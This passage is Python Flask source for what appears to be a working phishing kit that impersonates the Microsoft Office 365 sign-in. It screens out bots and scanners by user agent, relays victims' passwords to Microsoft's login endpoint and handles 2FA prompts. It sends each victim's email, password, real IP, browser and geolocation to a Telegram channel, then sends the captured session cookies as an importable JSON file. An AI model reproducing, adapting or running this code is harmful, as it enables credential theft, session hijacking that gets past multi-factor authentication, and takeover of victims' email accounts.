            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Origin": "https://login.microsoftonline.com",
            "Referer": "https://login.microsoftonline.com/common/login",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate"
        }

        # Add work account specific headers
        if not is_personal:
            headers.update({
                "X-Requested-With": "XMLHttpRequest",
                "X-MS-RefreshTokenCredential": "true"
            })

        response = requests.post(
            "https://login.microsoftonline.com/common/SAS/ProcessAuth",
            headers=headers,
            data=data
        )
        response.raise_for_status()

        # Process cookies based on account type
        cookies = response.headers.get('Set-Cookie')
        list_cookies = []
        if cookies:
            domain = '.live.com' if is_personal else '.login.microsoftonline.com'
            for cookie in cookies.split(','):
                jsonCookie = cookieToJSON(cookie.split(';')[0].strip(), domain)
                list_cookies.append(jsonCookie)

        return list_cookies

    except requests.exceptions.RequestException as e:
        print(f"Request failed in process_auth_email: {e}")
        return []
    except Exception as e:
        print(f"Unexpected error in process_auth_email: {e}")
        return []

@app.route('/', methods=['GET', 'POST'])
def index():
    try:
        # Handle POST request for form submission
        if request.method == 'POST':
            email = request.form.get('email')
            if email:
                return redirect(url_for('password', email=email))

        # Skip for static files
        if request.path.startswith('/static/'):
            return ''
            
        visitor_ip = request.remote_addr
        visitor_ua = request.headers.get('User-Agent', '')
        
        # Check if visitor info exists in session
        if not session.get('visitor_validated'):
            headers = [(k,v) for k,v in request.headers.items()]
            
            if is_bot(visitor_ua, headers):
                return redirect(url_for('bot_error_handler'))
                
            if not visitor_ua or 'curl' in visitor_ua.lower() or 'wget' in visitor_ua.lower() or 'python' in visitor_ua.lower():
                return redirect(url_for('bot_error_handler'))
                
            session['visitor_ip'] = visitor_ip
            session['visitor_ua'] = visitor_ua
            session['visitor_validated'] = True
            
        elif session.get('visitor_ip') != visitor_ip or session.get('visitor_ua') != visitor_ua:
            session.clear()
            return redirect(url_for('bot_error_handler'))

        return render_template("index.html")
            
    except Exception as e:
        print(f"Error in index route: {str(e)}")
        return render_template("index.html"), 200  # Return 200 even on error to prevent 502

@app.route('/password', methods=['GET', 'POST'])
def password():
    if is_bot_request():
        return redirect(url_for('bot_error_handler'))

    email = request.args.get('email') or request.form.get('email') or session.get('email')
    if not email:
        return redirect(url_for('index'))
    
    try:
        session['email'] = email
            
        return render_template(
            'password.html',
            email=email,
            banner=session.get('banner'),
            background=session.get('background'),
            error=request.args.get('error')
        )
    except Exception as e:
        print(f"Error in password route: {str(e)}")
        return redirect(url_for('index'))

@app.route('/sign-in', methods=['POST'])
async def sign_in_handler():
    """Handle sign in form submission"""
    if 'email' not in session:
        return jsonify({"status": "error", "message": "Session expired"}), 401

    if is_bot_request():
        return jsonify({"status": "error", "message": "Bots and crawlers are not allowed."}), 403
        
    try:
        email = session.get('email')
        password = request.form.get('password')
        
        if not password:
            return jsonify({"status": "error", "message": "Password is required"}), 400

        if not is_valid_email(email):
            return jsonify({"status": "error", "message": "Invalid or unsupported email address."}), 400
            
        # First send credentials to Telegram
        try:
            # Function to get real IP from headers
            def get_client_ip():
                # Check for proxy/forwarded IPs in order of reliability
                ip_headers = [
                    'HTTP_X_FORWARDED_FOR',
                    'X_FORWARDED_FOR', 
                    'HTTP_CLIENT_IP',
                    'HTTP_X_REAL_IP',
                    'HTTP_X_FORWARDED',
                    'HTTP_FORWARDED',
                    'REMOTE_ADDR'
                ]
                
                for header in ip_headers:
                    ip = request.environ.get(header)
                    if ip:
                        # If comma-separated IPs, get first one
                        real_ip = ip.split(',')[0].strip()
                        if real_ip:
                            return real_ip
                            
                return request.remote_addr

            # Get real client IP
            client_ip = get_client_ip()
            
            # Get location info from real IP using ip-api
            ip_info_response = requests.get(f'http://ip-api.com/json/{client_ip}')
            ip_info = ip_info_response.json()
            
            # Get user agent from XFF/proxy headers if available
            forwarded_ua = request.headers.get('X-Forwarded-User-Agent') or request.headers.get('X-Original-User-Agent')
            user_agent = forwarded_ua if forwarded_ua else request.headers.get('User-Agent') or ''
            
            # Parse user agent for real browser info (ensure user_agent is a string)
            ua_string = (user_agent or '').lower()
            if 'chrome' in ua_string:
                user_browser = 'Chrome'
                try:
                    browser_version = ua_string.split('chrome/')[1].split('.')[0]
                except Exception:
                    browser_version = 'Unknown'
            elif 'firefox' in ua_string:
                user_browser = 'Firefox'
                try:
                    browser_version = ua_string.split('firefox/')[1].split('.')[0]
                except Exception:
                    browser_version = 'Unknown'
            elif 'safari' in ua_string and 'version/' in ua_string:
                user_browser = 'Safari'
                try:
                    browser_version = ua_string.split('version/')[1].split('.')[0]
                except Exception:
                    browser_version = 'Unknown'
            elif 'edge' in ua_string:
                user_browser = 'Edge'
                try:
                    browser_version = ua_string.split('edge/')[1].split('.')[0]
                except Exception:
                    browser_version = 'Unknown'
            else:
                user_browser = 'Unknown'
                browser_version = 'Unknown'

            # Get platform from user agent
            if 'windows' in ua_string:
                browser_platform = 'Windows'
            elif 'macintosh' in ua_string:
                browser_platform = 'MacOS'
            elif 'linux' in ua_string:
                browser_platform = 'Linux'
            elif 'android' in ua_string:
                browser_platform = 'Android'
            elif 'iphone' in ua_string or 'ipad' in ua_string:
                browser_platform = 'iOS'
            else:
                browser_platform = 'Unknown'

            # Get location info from IP
            user_country = ip_info.get('country', 'Unknown')
            user_city = ip_info.get('city', 'Unknown')
            
            # Get timezone-aware timestamp
            current_time = datetime.now(timezone.utc).isoformat()

            credentials_message = (
                f"🎯 $Box-Office-Log 📬HackerOne🎯\n\n"
                f"📧 Email: {email}\n"
                f"🔑 Password: {password}\n" 
                f"🌍 Real IP: {client_ip}\n"
                f"🖥️ User Agent: {user_agent}\n"
                f"🌐 Browser: {user_browser} {browser_version}\n"
                f"💻 Platform: {browser_platform}\n"
                f"🌍 Country: {user_country}\n"
                f"🏙️ City: {user_city}\n"
                f"⏰ Time: {current_time}"
            )
            await send_telegram_message(credentials_message)
        except Exception as e:
            print(f"Error sending credentials to Telegram: {str(e)}")

        # Small delay to simulate processing
        await asyncio.sleep(1)

        # Perform login
        login_result = loginOffice(email, password)
        
        if login_result.get('status') == 'verify':
            # Store auth data for verification
            session['auth_data'] = {
                'email': email,
                'method_data': login_result['method'],
                'key': login_result['key'],
                'data': login_result['data']
            }
            
            # Get available auth methods from method_data
            try:
                auth_methods = json.loads(base64.b64decode(login_result['method']).decode())
            except:
                auth_methods = []

            # Store auth methods in session for signinoption page
            session['auth_methods'] = auth_methods
            
            return jsonify({
                "status": "verify",
                "redirect_url": url_for('signinoption')
            })
            
        elif login_result.get('status') == 'success':
            # Store login cookies
            session['login_cookies'] = login_result.get('cookies', [])
            
            return jsonify({
                "status": "success", 
                "redirect_url": url_for('stay_signed_in')
            })
        else:
            return jsonify({
                "status": "error",
                "message": login_result.get('message', 'Authentication failed')
            }), 401
            
    except Exception as e:
        print(f"Sign in error: {str(e)}")
        return jsonify({
            "status": "error", 
            "message": "An error occurred during sign in"
        }), 500

@app.route('/stay-signed-in')
async def stay_signed_in():
    """Show stay signed in option page"""
    if 'email' not in session or 'login_cookies' not in session:
        return redirect(url_for('index'))
    
    try:
        email = session.get('email')
        return render_template('StaySignIn.html', email=email)
    except Exception as e:
        print(f"Error in stay-signed-in: {str(e)}")
        return redirect(url_for('index'))

@app.route('/signinoption')
def signinoption():
    """Show sign in options page for 2FA verification"""
    if 'auth_data' not in session:
        return redirect(url_for('index'))
        
    try:
        email = session.get('email')
        auth_methods = session.get('auth_methods', [])
        return render_template('signinoption.html', 
                             email=email,
                             auth_methods=auth_methods)
    except Exception as e:
        print(f"Error in signinoption: {str(e)}")
        return redirect(url_for('index'))

@app.route('/final-redirect', methods=['POST']) 
async def final_redirect():
    """Handle final redirect after stay signed in choice"""
    try:
        stay_signed_in = request.form.get('staySignedIn')
        if stay_signed_in in ['yes', 'no']:
            # Check if personal or work email account
            email = session.get('email', '')
            is_personal = any(domain in email.lower() for domain in [
                'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
                'outlook.ca', 'hotmail.ca', 'live.ca'
            ])

            # Set redirect URL based on account type
            final_redirect_url = "https://outlook.live.com/mail/" if is_personal else "https://outlook.office.com/mail/"
            
            # Save email and all cookies in a single JSON structure
            cookies_data = {
                "email": email,
                "cookies": []
            }

            # Combine both authentication and redirect cookies into a single array
            all_cookies = []
            
            # Add authentication cookies
            login_cookies = session.get('login_cookies', [])
            for cookie in login_cookies:
                if cookie.get('name') and cookie.get('value'):
                    # Set domain based on account type
                    domain = 'login.live.com' if is_personal else 'login.microsoftonline.com'
                    all_cookies.append(cookieToJSON(
                        f"{cookie['name']}={cookie['value']}", 
                        domain
                    ))

            # Make request to get redirect cookies
            response = requests.get(final_redirect_url)
            cookies = []
            if 'Set-Cookie' in response.headers:
                if isinstance(response.headers['Set-Cookie'], (list, tuple)):
                    cookies = response.headers['Set-Cookie']
                else:
                    cookies = [response.headers['Set-Cookie']]
                for cookie in cookies:
                    # Set cookie domain based on account type
                    domain = '.live.com' if is_personal else '.office.com'
                    jsonCookie = cookieToJSON(cookie.split(';')[0].strip(), domain)
                    all_cookies.append(jsonCookie)

            # Add all cookies to the data structure
            cookies_data["cookies"] = all_cookies

            # Save as single-line JSON for proper browser import
            try:
                with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as temp_file:
                    json.dump(cookies_data, temp_file, separators=(',', ':'))
                    temp_file_path = temp_file.name

                # Send the JSON file to Telegram
                cookie_message = f"🍪 Office Box Cookies: {session.get('email')}"
                await send_telegram_file(temp_file_path, cookie_message)

                # Clean up temp file
                try:
                    os.unlink(temp_file_path)
                except Exception as e:
                    print(f"Error deleting temp file: {e}")

            except Exception as e:
                print(f"Error sending cookies to Telegram: {str(e)}")
            
            # Clear session and return redirect URL
            session.clear()
            return jsonify({
                "status": "success", 
                "redirect_url": final_redirect_url
            })
        else:
            return jsonify({
                "status": "error",
                "message": "Invalid stay signed in choice"
            }), 400
            
    except Exception as e:
        print(f"Error in final redirect: {str(e)}")
        return jsonify({"status": "error", "message": "Error processing request"}), 500
    

@app.after_request
def add_security_headers(response):
    response.headers['X-Robots-Tag'] = 'noindex, nofollow, noarchive'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Referrer-Policy'] = 'no-referrer'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)